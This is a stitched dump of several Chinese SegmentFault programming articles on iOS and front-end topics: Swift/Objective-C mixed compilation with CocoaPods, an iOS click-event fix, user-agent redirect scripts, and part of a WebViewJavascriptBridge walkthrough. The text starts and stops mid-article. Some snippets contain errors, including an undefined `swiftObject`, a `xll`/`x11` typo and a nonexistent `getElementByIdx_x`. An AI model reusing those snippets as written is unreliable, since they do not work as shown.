<p><span class=""img-wrap""><img data-src=""/img/bVOmar?w=1131&amp;h=677"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<h2>Say hello</h2>
<p>我们选中<code>Main.storyboard</code>这个文件，然后在右侧找到Label标签，并将它拖动到界面中，拖动过程中触摸板会有震动给你反馈，如下图。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOmaw?w=1394&amp;h=895"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p>接下来就很简单了，我们双击Label标签然后输入 <code>Hello world</code>，在按下 <code>cmd + R</code>键，我们的第一个IOS程序就运行起来了。</p>
<blockquote><p>提示：<code>cmd + 1、2、3、4、5</code>键可以改变模拟器的尺寸，数字键是单选，如果你非要一起按我也没办法。</p></blockquote>
<h2>CocoaPods</h2>
<h3>简介</h3>
<p>当我们开发应用时必定会用到第三方库，以前我们都是直接下载源文件到项目中，最后有了node和npm，生活质量瞬间提高了很多，那么在ios中，CocoaPods就是iOS最常用最有名的类库管理器了。</p>
<h3>安装</h3>
<p>在终端中依次执行下面的命令</p>
<p><code>gem sources --remove https://rubygems.org/</code><br><code>sudo gem install cocoapods</code></p>
<p>第一条命令是改变文件源，第二个则是cocoapods，等待一段时间后看见如下字样说明安装成功。</p>
<p><code>*** CURRENT SOURCES ***</code></p>
<p>注意：也有可能不是这个提醒，所以我们验证一下。</p>
<p><code>pod --version</code></p>
<p>如果出现版本号明细就说明我们已经安装成功了。</p>
<h3>使用</h3>
<p>cocoapods的配置和我们npm稍有差异，不过也很简单，首先进入我们的项目执行命令。<br><code>pod init</code><br>cocoapods会在目录中创建<code>Podfile</code>文件，类似npm中的<code>package.json</code>。</p>
<p>我们来看一下生成好的podfile文件。</p>
<pre><code class=""shell"">    # Uncomment this line to define a global platform for your project
    # platform :ios, '9.0'
    
    target 'iwtest' do
      # Uncomment this line if you're using Swift or would like to use dynamic frameworks
      # use_frameworks!
    
      # Pods for iwtest
    
      target 'iwtestTests' do
        inherit! :search_paths
        # Pods for testing
      end
    
      target 'iwtestUITests' do
        inherit! :search_paths
        # Pods for testing
      end
    end</code></pre>
<p>现在我们要安装一个第三方的类库 <code>SnapKit</code>，这是它的github主页<code>https://github.com/SnapKit/SnapKit</code>，这个类库是用来做布局的，在这里要表扬一下CSS，绝对是世界上最好的布局语言，没有之一，等我们后面学了IOS的布局方式后你就会深深理解我这句话的意思了。</p>
<p>编辑<code>podfile</code>然后加入我们的需要的类库。</p>
<p><code>vim Podfile</code></p>
<pre><code class=""shell"">    # 定式部分
    source 'https://github.com/CocoaPods/Specs.git'
    platform :ios, '10.0'
    use_frameworks!
    
    target 'testTodo' do
    
      # 需要引入的类库写到这里

      pod 'SnapKit', '~&gt; 3.2.0'
    
      # Pods for testTodo
      target 'testTodoTests' do
        inherit! :search_paths
        # Pods for testing
      end
    
      target 'testTodoUITests' do
        inherit! :search_paths
        # Pods for testing
      end
    
    end</code></pre>
<p>退出编辑模式后执行命令进行安装<br><code>pod install</code></p>
<p>OK，如果不出问题我们就发现类库已经被安装了，这个时候还有一个小细节，我们如果使用了cocoapods来管理类库，它会帮我们在项目中创建一个 <code>testTodo.xcworkspace</code>启动文件，以后我们打开应用就要通过这个文件来打开了。</p>
<h2>OC Swift 混编</h2>
<p>这一节就到了我们要讲的最重要的一节，众所周知RN是用OC编写的，那如何才能是用Swift来编写RN的组件呢，答案就是IOS原生就支持OC和Swift混编应用。</p>
<p>无论是在Swift的项目中新建OC文件还是在OC的项目中新建Swift文件，Xcode都会有下面的一个提示。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOmaF?w=733&amp;h=204"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p>询问是否创建一个bridge文件，这个文件就是混编的关键，选择 Create之后会发现工程中多出了一个 <code>project-iwtest-Bridging-Header.h</code>的文件，project是你的工程名。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOmaG?w=280&amp;h=78"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p>如上图，我在OC的项目中创建了一个<code>test.swift</code>文件，并创建了一个bridge文件，这个文件什么意思呢，我们来看下<a href=""https://developer.apple.com/library/content/documentation/Swift/Conceptual/BuildingCocoaApps/MixandMatch.html"" rel=""nofollow noreferrer"">文档介绍</a>。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOmaH?w=1432&amp;h=1018"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p>大概意思就是告诉我们，这个文件主要的功能是将OC的文件接口放在一起然后供Swift文件调用，红圈标注出来的意思是如果你想自己手动创建一个bridge文件也是可以的，但是需要做相应的配置。</p>
<h3>在OC中调用Swift</h3>
<p>首先我们定义一个Swift类，定义一个sayHello函数，如果它被调用的话，控制台会打印出<code>Hello, Swift</code>日志。</p>
<pre><code class=""Swift"">    import Foundation

    @objc(MySwift)
    class MySwift:NSObject {
        
        func sayHello(){
            print(""Hello, Swift"")
        }
    }
</code></pre>
<p>然后我们编辑<code>ViewController.m</code> 文件</p>
<pre><code class=""C"">    #import ""ViewController.h""
    #import ""iwtest-Swift.h""
    
    @interface ViewController ()
    
    @end
    
    @implementation ViewController
    
    - (void)viewDidLoad {
        [super viewDidLoad];
        
        MySwift *mySwift = [[MySwift alloc] init];  
        [swiftObject log];
        // Do any additional setup after loading the view, typically from a nib.
    }
    
    
    - (void)didReceiveMemoryWarning {
        [super didReceiveMemoryWarning];
        // Dispose of any resources that can be recreated.
    }
    @end</code></pre>
<p>先执行<code>cmd + b</code>，发现没有报错，然后<code>cmd + r</code>，一段时间后控制台准确无误打印出<code>Hello, Swift</code>日志。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOmaK?w=353&amp;h=177"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p>现在我们来解释一下这其中的关键，总共有两处。</p>
<ol>
<li><p>Swift中的 <code>@objc(MySwift)</code> 这个关键字是Xode定义的，它在编译的时候将Swift文件也转换成OC文件，所以它最后才能以OC的代码格式执行。</p></li>
<li><p>OC文件中的<code> #import ""iwtest-Swift.h""</code>这个头文件也是Xcode自动创建的，它里面引用了所有你的工程中Swift文件，所以OC文件才能找到并引用。</p></li>
</ol>
<h3>在Swift中调用OC</h3>
<p>我们定义一个OC类，首先创建头文件 <code>Myoc.h</code></p>
<pre><code class=""C"">    #import &lt;foundation/Foundation.h&gt;

    @interface Myoc : NSObject {}
    
    + (void) sayHello;
    
    @end</code></pre>
<p>再创建实现文件 <code>Myoc.m</code></p>
<pre><code class=""C"">    #import &lt;Foundation/Foundation.h&gt;
    #import ""Myoc.h""
    
    @implementation Myoc
    
    +(void) sayHello {
        NSLog(@""Hello, OC"");
    }
    @end</code></pre>
<p>同样的，我们创建了一个<code>sayHello</code>函数，当这个函数执行的时候会打印一段日志 <code>Hello, OC</code><br>然后我们在刚才的Swift文件中调用这个函数。</p>
<pre><code class=""Swift"">    func sayHello(){
        print(""Hello, Swift"")
        
        Myoc.sayHello()
    }</code></pre>
<p>如果一切正常的话控制台会先后打印 <code>Hello, Swift</code>和<code>Hello, OC</code>，我们编译一下，结果报错了，根本找不到<code>Myoc</code>这个类。 这个时候我们最开始创建的那个bridge文件就派上用场了。</p>
<pre><code class=""C"">    #import ""Myoc.h""</code></pre>
<p>我们将头文件引入后再次编译发现没有报错，运行之后结果和预期相符。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVOmaM?w=448&amp;h=149"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<h2>结束语</h2>
<p>OC的一些语法确实很纠结，我后面后抽空把我理解到的，也是避不开的总结一下再编辑到这章里，希望对大家有用。</p>

                ", 使用Swift开发React Native组件（一）,1531971964,513,1,109,1,1,https://segmentfault.com/a/1190000009579393
64,1,0,6,"
                    
<h1>iOS下的点击事件失效解决方法</h1>
<hr>
<h2>问题描述</h2>
<hr>
<p>当委托给一个元素添加click事件时，如果事件是委托到 <code>document</code> 或 <code>body</code> 上，并且委托的元素是默认不可点击的(如 div, span 等)，此时 click 事件会失效。</p>
<p>demo:</p>
<pre><code class=""html"">
&lt;!DOCTYPE html&gt;
&lt;html lang=""en""&gt;
  &lt;head&gt;
    &lt;title&gt;&lt;/title&gt;
    &lt;meta charset=""UTF-8""&gt;
    &lt;meta http-equiv=""X-UA-Compatible"" content=""IE=edge,chrome=1""/&gt;
    &lt;meta name=""robots"" content=""index,follow""/&gt;
    &lt;meta name=""viewport"" content=""width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no""&gt;
    &lt;meta name=""apple-mobile-web-app-status-bar-style"" content=""black""/&gt;
    &lt;meta name=""apple-mobile-web-app-capable"" content=""yes""&gt;
    &lt;meta name=""format-detection"" content=""telphone=no, email=no""&gt;
    &lt;meta name=""renderer"" content=""webkit""&gt;
    &lt;meta http-equiv=""Cache-Control"" content=""no-siteapp"" /&gt;
    &lt;meta name=""HandheldFriendly"" content=""true""&gt;
    &lt;meta name=""MobileOptimized"" content=""320""&gt;
    &lt;meta name=""screen-orientation"" content=""portrait""&gt;
    &lt;meta name=""x5-orientation"" content=""portrait""&gt;
    &lt;meta name=""full-screen"" content=""yes""&gt;
    &lt;meta name=""x5-fullscreen"" content=""true""&gt;
    &lt;meta name=""browsermode"" content=""application""&gt;
    &lt;meta name=""x5-page-mode"" content=""app""&gt;
    &lt;meta name=""msapplication-tap-highlight"" content=""no""&gt;
    &lt;meta http-equiv=""Expires"" content=""0""&gt;
    &lt;meta http-equiv=""Pragma"" content=""no-cache""&gt;
    &lt;meta http-equiv=""Cache-control"" content=""no-cache""&gt;
    &lt;meta http-equiv=""Cache"" content=""no-cache""&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div class=""container""&gt;&lt;/div&gt;
      &lt;div class=""target""&gt;点击我!&lt;/div&gt;
    &lt;/div&gt;
    &lt;script src=""https://cdn.bootcss.com/jquery/2.2.4/jquery.js""&gt;&lt;/script&gt;
    &lt;script&gt;
      $(function () {
        // $(document).on('click', '.target', function () {})
        $('body').on('click', '.target', function () {
          alert('我被点击了！！！');
        });
      });
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h2>解决办法</h2>
<hr>
<p>解决办法有6种：</p>
<ul>
<li><p>将 <code>click</code> 事件直接绑定到目标元素(即 <code>.target</code> ) 上</p></li>
<li><p>将目标元素换成 <code>&lt;a&gt;</code> 或者 <code>&lt;button&gt;</code> 等可点击的元素</p></li>
<li><p>给目标元素添加一个空的 <code>onclick=""""</code>(&lt;div class=""target"" onclick=""""&gt;点击我!&lt;/div&gt;)</p></li>
<li><p>把 <code>click</code> 改成 <code>touchend</code> 或 <code>touchstart</code>（注意加上preventDefault）</p></li>
<li><p>将 <code>click</code> 元素委托到非 <code>document</code> 或 <code>body</code> 的父级元素上</p></li>
<li><p>给目标元素加一条样式规则 <code>cursor: pointer;</code> (cursor: pointer; -webkit-tap-highlight-color: transparent;)</p></li>
</ul>
<p>推荐后两种。推测在 Safari 中，不可点击元素的点击事件是不会冒泡到父级元素的。通过添加 <code>cursor: pointer;</code> 使得元素变成了可点击的了。</p>
<h2>补充</h2>
<hr>
<h3>问题</h3>
<hr>
<p>iOS系统 <code>input</code> 及 input内元素 <code>cursor: pointer;</code> 失效，使得在 iOS系统 上需要借助 <code>cursor</code> 属性才能生效的 <code>click</code> 事件无法触发</p>
<h3>解决办法</h3>
<ul>
<li><p>设置 font-size: 0;</p></li>
<li><p>把 <code>click</code> 改成 <code>touchend</code> （注意加上preventDefault）</p></li>
</ul>
<h2>参考文档</h2>
<ul>
<li><p><a href=""https://github.com/facebook/react/issues/134"" rel=""nofollow noreferrer"">https://github.com/facebook/react/issues/134</a></p></li>
<li><p><a href=""http://stackoverflow.com/questions/5421659/html-label-command-doesnt-work-in-iphone-browser/6472181#6472181"" rel=""nofollow noreferrer"">http://stackoverflow.com/questions/5421659/html-label-command-doesnt-work-in-iphone-browser/6472181#6472181</a></p></li>
</ul>

                ", iOS下的点击事件失效解决方法,1531971965,350,1,165,1,1,https://segmentfault.com/a/1190000009231024
65,1,0,6,"
                    
<pre><code>&lt;script type=""text/javascript""&gt; 
&lt;!-- 
        //平台、设备和操作系统 
        var system = { 
            win: false, 
            mac: false, 
            xll: false, 
            ipad:false 
        }; 
        //检测平台 
        var p = navigator.platform; 
        system.win = p.indexOf(""Win"") == 0; 
        system.mac = p.indexOf(""Mac"") == 0; 
        system.x11 = (p == ""X11"") || (p.indexOf(""Linux"") == 0); 
        system.ipad = (navigator.userAgent.match(/iPad/i) != null)?true:false; 
        //跳转语句，如果是手机访问就自动跳转到wap.baidu.com页面 
        if (system.win || system.mac || system.xll||system.ipad) { 
 
        } else { 
 
            window.location.href = ""http://www.jdpatro.com/3g/""; 
        } 
--&gt; 
&lt;/script&gt; </code></pre>
<h2>腾讯网的适配代码</h2>
<pre><code>&lt;script type=""text/javascript""&gt;  
if(/AppleWebKit.*Mobile/i.test(navigator.userAgent) || (/MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/.test(navigator.userAgent))){ 
    if(window.location.href.indexOf(""?mobile"")&lt;0){ 
        try{ 
            if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)){ 
                window.location.href=""http://shipei.qq.com/index.htm""; 
            }else if(/iPad/i.test(navigator.userAgent)){ 
            }else{ 
                window.location.href=""http://shipei.qq.com/simple/s/index/"" 
            } 
        }catch(e){} 
    } 
} 
&lt;/script&gt; </code></pre>
<pre><code>&lt;script type=""text/javascript""&gt; 
    var browser = { 
        versions : function() { 
            var u = navigator.userAgent, app = navigator.appVersion; 
            return {//移动终端浏览器版本信息                                  
            trident : u.indexOf('Trident') &gt; -1, //IE内核                                  
            presto : u.indexOf('Presto') &gt; -1, //opera内核                                  
            webKit : u.indexOf('AppleWebKit') &gt; -1, //苹果、谷歌内核                                  
            gecko : u.indexOf('Gecko') &gt; -1 &amp;&amp; u.indexOf('KHTML') == -1, //火狐内核                                 
            mobile : !!u.match(/AppleWebKit.*Mobile.*/) 
                    || !!u.match(/AppleWebKit/), //是否为移动终端                                  
            ios : !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端                  
            android : u.indexOf('Android') &gt; -1 || u.indexOf('Linux') &gt; -1, //android终端或者uc浏览器                                  
            iPhone : u.indexOf('iPhone') &gt; -1 || u.indexOf('Mac') &gt; -1, //是否为iPhone或者QQHD浏览器                     
            iPad: u.indexOf('iPad') &gt; -1, //是否iPad        
            webApp : u.indexOf('Safari') == -1,//是否web应该程序，没有头部与底部 
            google:u.indexOf('Chrome')&gt;-1 
        }; 
    }(), 
    language : (navigator.browserLanguage || navigator.language).toLowerCase() 
    } 
    document.writeln(""语言版本: ""+browser.language); 
    document.writeln("" 是否为移动终端: ""+browser.versions.mobile); 
&lt;/script&gt; </code></pre>
<h2>JS 判断浏览器客户端类型(ipad,iphone,android)</h2>
<pre><code>&lt;script type=""text/javascript""&gt;  
   var bForcepc 
= fGetQuery(""dv"") == ""pc"";   
   function 
fBrowserRedirect(){   
       var sUserAgent = navigator.userAgent.toLowerCase();  
       var bIsIpad = sUserAgent.match(/ipad/i) == 
""ipad"";    
       var bIsIphoneOs = sUserAgent.match(/iphone os/i) == ""iphone os"";  
       var bIsMidp = sUserAgent.match(/midp/i) == ""midp"";  
       var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == ""rv:1.2.3.4"";  
       var bIsUc = sUserAgent.match(/ucweb/i) == ""ucweb"";  
       var bIsAndroid = sUserAgent.match(/android/i) == ""android"";  
       var bIsCE = sUserAgent.match(/windows ce/i) == ""windows ce"";  
       var bIsWM = sUserAgent.match(/windows mobile/i) == ""windows 
mobile"";   
       if(bIsIpad){   
           var sUrl = 
location.href;      
           if(!bForcepc){   
               window.location.href = ""http://ipad.mail.163.com/"";  
           }   
       }   
       if(bIsIphoneOs || bIsAndroid){   
           var sUrl = 
location.href;      
           if(!bForcepc){   
               window.location.href = ""http://smart.mail.163.com/"";  
           }   
       }   
       if(bIsMidp||bIsUc7||bIsUc||bIsCE||bIsWM){   
           var sUrl = 
location.href;      
           if(!bForcepc){   
               window.location.href = ""http://m.mail.163.com/"";  
           }   
       }   
   }  
   function 
fGetQuery(name){//获取参数值   
       var sUrl = window.location.search.substr(1);  
       var r = sUrl.match(new RegExp(""(^|&amp;)"" + name + 
""=([^&amp;]*)(&amp;|$)""));  
       return (r == null ? null : (r[2]));  
   }  
   function 
fShowVerBlock(){     
       if(bForcepc){   
           document.getElementByIdx_x(""dv_block"").style.display = ""block"";  
       }   
       else{   
           document.getElementByIdx_x(""ad_block"").style.display = ""block"";  
       }   
   }  
   fBrowserRedirect();   
   &lt;/script&gt; </code></pre>

                ", 通过JS语句判断WEB网站的访问端是电脑还是手机,1531971967,110,1,313,1,1,https://segmentfault.com/a/1190000009153213
66,1,0,6,"
                    
<h2>基本说明</h2>
<p>我们的项目是一个OC与javascript重度交互的app，OC与javascript交互的那部分是在<a href=""https://github.com/marcuswestin/WebViewJavascriptBridge"" rel=""nofollow noreferrer"">WebViewJavascriptBridge的github地址</a>的基础上修改的，WebViewJavascriptBridge应该是当前最流行最成功的OC与Web交互实现了。最近看了一下他的实现原理，顺便也为后面项目扩展打下基础。<br>为了简化讲解过程，我忽略了UIWebView的实现过程，只解析WKWebView的实现过程。</p>
<p>我们可以在OC中调用javascript方法，但是反过来不能在javascript中调用OC方法。所以<code>WebViewJavascriptBridge</code>的实现过程就是在OC环境和javascript环境各自保存一个相互调用的信息。每一个调用之间都有id和callbackid来找到两个环境对应的处理。下图是我对于每个类的讲解：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008948597?w=906&amp;h=614"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""img"" title=""img""></span></p>
<ul>
<li><p>nouse文件夹下面的文件是与UIWebView相关的东西，我们暂时不管，基本原理和WKWebView一样。其中<code>WebViewJavascriptBridge_JS.m</code>中是javascript代码，为了方便理解，我直接新建了一个<code>WebViewJavascriptBridge_JS.js</code>文件来代替，方便后面解析。</p></li>
<li><p><code>WebViewJavascriptBridge_JS.js</code>文件中是javascript环境的bridge初始化和处理，里面负责接收oc发给javascript的消息，并且把javascript环境的消息发送给oc。</p></li>
<li><p><code>WKWebViewJavascriptBridge.m</code>主要负责OC环境的消息处理，并且把OC环境的消息发送给javascript环境。</p></li>
<li><p><code>WebViewJavascriptBridgeBase.m</code>主要实现了OC环境的bridge初始化和处理。</p></li>
<li><p><code>ExampleApp.html</code>主要用于模拟生产环境下的web端。</p></li>
</ul>
<h2>初始化过程</h2>
<h3>1、OC环境初始化</h3>
<p>我们从OC环境的初始化开始。</p>
<pre><code class=""objc"">//初始化一个OC环境的桥WKWebViewJavascriptBridge并且初始化。
+ (instancetype)bridgeForWebView:(WKWebView*)webView {
    WKWebViewJavascriptBridge* bridge = [[self alloc] init];
    //调用下面那个方法
    [bridge _setupInstance:webView];
    [bridge reset];
    return bridge;
}
//初始化
- (void) _setupInstance:(WKWebView*)webView {
    _webView = webView;
    _webView.navigationDelegate = self;
    _base = [[WebViewJavascriptBridgeBase alloc] init];
    _base.delegate = self;
}

//messageHandlers用于保存OC环境注册的方法，key是方法名，value是这个方法对应的回调block
//startupMessageQueue用于保存是实话过程中需要发送给javascirpt环境的消息。
//responseCallbacks用于保存OC于javascript环境相互调用的回调模块。通过_uniqueId加上时间戳来确定每个调用的回调。
- (id)init {
    if (self = [super init]) {
        self.messageHandlers = [NSMutableDictionary dictionary];
        self.startupMessageQueue = [NSMutableArray array];
        self.responseCallbacks = [NSMutableDictionary dictionary];
        _uniqueId = 0;
    }
    return self;
}</code></pre>
<p>所有与javascript之间交互的信息都存储在<code>messageHandlers</code>和<code>responseCallbacks</code>中。这两个属性记录了OC环境与javascript交互的信息。</p>
<h3>2、OC环境注册方法</h3>
<p>注册一个OC方法<code>OC提供方法给JS调用</code>给javascript调用，并且把他的回调实现保存在<code>messageHandlers</code>中。</p>
<pre><code class=""objc"">[_bridge registerHandler:@""OC提供方法给JS调用"" handler:^(id data, WVJBResponseCallback responseCallback) {
    //NSLog(@""testObjcCallback called: %@"", data);
    responseCallback(@""OC发给JS的返回值"");
}];

- (void)registerHandler:(NSString *)handlerName handler:(WVJBHandler)handler {
    _base.messageHandlers[handlerName] = [handler copy];
}</code></pre>
<h3>3、Web环境初始化</h3>
<p>加载Web环境的html,这里就是<code>ExampleAPP.html</code>文件,我删除了非关键部分。</p>
<pre><code class=""javascript"">function setupWebViewJavascriptBridge(callback) {
     //第一次调用这个方法的时候，为false
    if (window.WebViewJavascriptBridge) {
        var result = callback(WebViewJavascriptBridge);
        return result;
    }
    //第一次调用的时候，也是false
    if (window.WVJBCallbacks) {
        var result = window.WVJBCallbacks.push(callback);
        return result;
    }
    //把callback对象赋值给对象。
    window.WVJBCallbacks = [callback];
    //这段代码的意思就是执行加载WebViewJavascriptBridge_JS.js中代码的作用
    var WVJBIframe = document.createElement('iframe');
    WVJBIframe.style.display = 'none';
    WVJBIframe.src = 'https://__bridge_loaded__';
    document.documentElement.appendChild(WVJBIframe);
    setTimeout(function() {
        document.documentElement.removeChild(WVJBIframe)
    }, 0);
}

//setupWebViewJavascriptBridge执行的时候传入的参数，这是一个方法。
function callback(bridge) {
    var uniqueId = 1
    //把WEB中要注册的方法注册到bridge里面
    bridge.registerHandler('OC调用JS提供的方法', function(data, responseCallback) {
        log('OC调用JS方法成功', data)
        var responseData = { 'JS给OC调用的回调':'回调值!' }
        log('OC调用JS的返回值', responseData)
        responseCallback(responseData)
    })
};
//驱动所有hander的初始化
setupWebViewJavascriptBridge(callback);</code></pre>
<p>我们调用<code>setupWebViewJavascriptBridge</code>函数，并且这个函数传入的callback也是一个函数。callback函数中有我们在javascript环境中注册的<code>OC调用JS提供的方法</code>方法。<code>setupWebViewJavascriptBridge</code>的实现过程中我们可以发现，如果不是第一次初始化，会通过<code>window.WebViewJavascriptBridge</code>或者<code>window.WVJBCallbacks</code>两个判断返回。</p>
<p>iframe可以理解为webview中的窗口，当我们改变iframe的src属性的时候，相当于我们浏览器实现了链接的跳转。比如从<code>www.baidu.com</code>跳转到<code>www.google.com</code>。下面这段代码的目的就是实现一个到<code>https://__bridge_loaded__</code>的跳转。从而达到初始化javascript环境的bridge的作用。</p>
<pre><code class=""javascript"">//这段代码的意思就是执行加载WebViewJavascriptBridge_JS.js中代码的作用
var WVJBIframe = document.createElement('iframe');
WVJBIframe.style.display = 'none';
WVJBIframe.src = 'https://__bridge_loaded__';
document.documentElement.appendChild(WVJBIframe);
setTimeout(function() {
    document.documentElement.removeChild(WVJBIframe)
}, 0);</code></pre>
<p>我们知道只要webview有跳转，就会调用webview的代理方法。我们重点看下面这个代理方法。</p>
<pre><code class=""objc"">- (void)webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler {
    if (webView != _webView) { return; }
    NSURL *url = navigationAction.request.URL;
    NSLog(@""点开URL%@"",url);
    __strong typeof(_webViewDelegate) strongDelegate = _webViewDelegate;
    //如果是WebViewJavascriptBridge发送或者接受的消息，则特殊处理。否则按照正常流程处理。
    if ([_base isWebViewJavascriptBridgeURL:url]) {
        //1第一次注入JS代码
        if ([_base isBridgeLoadedURL:url]) {
            [_base injectJavascriptFile];
        //处理WEB发过来的消息
        } else if ([_base isQueueMessageURL:url]) {
            [self WKFlushMessageQueue];
        } else {
            [_base logUnkownMessage:url];
        }
        decisionHandler(WKNavigationActionPolicyCancel);
    }
    //下面是webview的正常代理执行流程，不用管。
    if (strongDelegate &amp;&amp; [strongDelegate respondsToSelector:@selector(webView:decidePolicyForNavigationAction:decisionHandler:)]) {
        [_webViewDelegate webView:webView decidePolicyForNavigationAction:navigationAction decisionHandler:decisionHandler];
    } else {
        decisionHandler(WKNavigationActionPolicyAllow);
    }
}</code></pre>
<p>在这段代码中，我们首先通过<code>[_base isWebViewJavascriptBridgeURL:url]</code>来判断是否是普通的跳转还是<code>webViewjavascriptBridege</code>的跳转。如果是<code>__bridge_loaded__</code>表示是初始化javascript环境的消息，如果是<code>__wvjb_queue_message__</code>则表示是发送javascript消息。<code>https://__bridge_loaded__</code>显然是第一种消息。OC具体具体判断逻辑代码如下：</p>
<pre><code class=""objc"">#define kOldProtocolScheme @""wvjbscheme""
#define kNewProtocolScheme @""https""
#define kQueueHasMessage   @""__wvjb_queue_message__""
#define kBridgeLoaded      @""__bridge_loaded__""

//是否是WebViewJavascriptBridge框架相关的链接
- (BOOL)isWebViewJavascriptBridgeURL:(NSURL*)url {
    if (![self isSchemeMatch:url]) {
        return NO;
    }
    BOOL result =  [self isBridgeLoadedURL:url] || [self isQueueMessageURL:url];
    return result;
}
/*
    是否是WebViewJavascriptBridge发送或者接受的消息
 */
- (BOOL)isSchemeMatch:(NSURL*)url {
    NSString* scheme = url.scheme.lowercaseString;
    BOOL result = [scheme isEqualToString:kNewProtocolScheme] || [scheme isEqualToString:kOldProtocolScheme];
    return result;
}
//是WebViewJavascriptBridge发送的消息还是WebViewJavascriptBridge的初始化消息。
- (BOOL)isQueueMessageURL:(NSURL*)url {
    NSString* host = url.host.lowercaseString;
    return [self isSchemeMatch:url] &amp;&amp; [host isEqualToString:kQueueHasMessage];
}
//是否是https://__bridge_loaded__这种初始化加载消息
- (BOOL)isBridgeLoadedURL:(NSURL*)url {
    NSString* host = url.host.lowercaseString;
    BOOL result = [self isSchemeMatch:url] &amp;&amp; [host isEqualToString:kBridgeLoaded];
    return result;
}
</code></pre>
<p>接下来调用<code>[_base injectJavascriptFile]</code>方法，这个方法的作用就是把<code>WebViewJavascriptBridge_JS.js</code>中的方法注入到webview中并且执行，从而达到初始化javascript环境的brige的作用。</p>
<pre><code class=""objc"">//初始化的是否注入WebViewJavascriptBridge_JS.js
- (void)injectJavascriptFile {
    NSString *js;
    //WebViewJavascriptBridge_JS.js文件内容其实就是WebViewJavascriptBridge_JS.m对应的内容，我只是把它整理方便阅读。
    if (true) {
        js = [NSString stringWithContentsOfFile:[[NSBundle mainBundle] pathForResource:@""WebViewJavascriptBridge_JS.js"" ofType:nil] encoding:NSUTF8StringEncoding error:nil];
    }else{
        js = WebViewJavascriptBridge_js();
    }
    //把javascript代码注入webview中执行,这里执行具体的注入操作。
    [self _evaluateJavascript:js];
    //如果javascript环境初始化完成以后，有startupMessageQueue消息。则立即发送消息。
    if (self.startupMessageQueue) {
        NSArray* queue = self.startupMessageQueue;
        self.startupMessageQueue = nil;
        for (id queuedMessage in queue) {
            [self _dispatchMessage:queuedMessage];
        }
    }
}
//把javascript代码写入webview
- (NSString*) _evaluateJavascript:(NSString*)javascriptCommand {
    [_webView evaluateJavaScript:javascriptCommand completionHandler:nil];
    return NULL;
}</code></pre>
<h3>3、WebViewJavascriptBridge_JS.js解析</h3>
<p>上面我们讲到了注入javascript方法到webview中。具体的代码就是<code>WebViewJavascriptBridge_JS.js</code>这个文件中的方法。我们通过分析这个文件的代码可以知道javascript环境的bridge是如何初始化的。</p>
<pre><code class=""javascript"">;(function() {
    //如果已经初始化了，则返回。
    if (window.WebViewJavascriptBridge) {
        return;
    }
    if (!window.onerror) {
        window.onerror = function(msg, url, line) {
            console.log(""WebViewJavascriptBridge: ERROR:"" + msg + ""@"" + url + "":"" + line);
        }
    }
    //初始化一些属性。
    var messagingIframe;
    //用于存储消息列表
    var sendMessageQueue = [];
    //用于存储消息
    var messageHandlers = {};
    //通过下面两个协议组合来确定是否是特定的消息，然后拦击。
    var CUSTOM_PROTOCOL_SCHEME = 'https';
    var QUEUE_HAS_MESSAGE = '__wvjb_queue_message__';
    //oc调用js的回调
    var responseCallbacks = {};
    //消息对应的id
    var uniqueId = 1;
    //是否设置消息超时
    var dispatchMessagesWithTimeoutSafety = true;
    //web端注册一个消息方法
    function registerHandler(handlerName, handler) {
        messageHandlers[handlerName] = handler;
    }
    //web端调用一个OC注册的消息
    function callHandler(handlerName, data, responseCallback) {
        if (arguments.length == 2 &amp;&amp; typeof data == 'function') {
            responseCallback = data;
            data = null;
        }
        _doSend({ handlerName: handlerName, data: data }, responseCallback);
    }
    function disableJavscriptAlertBoxSafetyTimeout() {
        dispatchMessagesWithTimeoutSafety = false;
    }
        //把消息转换成JSON字符串返回
    function _fetchQueue() {
        var messageQueueString = JSON.stringify(sendMessageQueue);
        sendMessageQueue = [];
        return messageQueueString;
    }
    //OC调用JS的入口方法
    function _handleMessageFromObjC(messageJSON) {
        _dispatchMessageFromObjC(messageJSON);
    }

    //初始化桥接对象，OC可以通过WebViewJavascriptBridge来调用JS里面的各种方法。
    window.WebViewJavascriptBridge = {
        registerHandler: registerHandler,
        callHandler: callHandler,
        disableJavscriptAlertBoxSafetyTimeout: disableJavscriptAlertBoxSafetyTimeout,
        _fetchQueue: _fetchQueue,
        _handleMessageFromObjC: _handleMessageFromObjC
    };


    //处理从OC返回的消息。
    function _dispatchMessageFromObjC(messageJSON) {
        if (dispatchMessagesWithTimeoutSafety) {
            setTimeout(_doDispatchMessageFromObjC);
        } else {
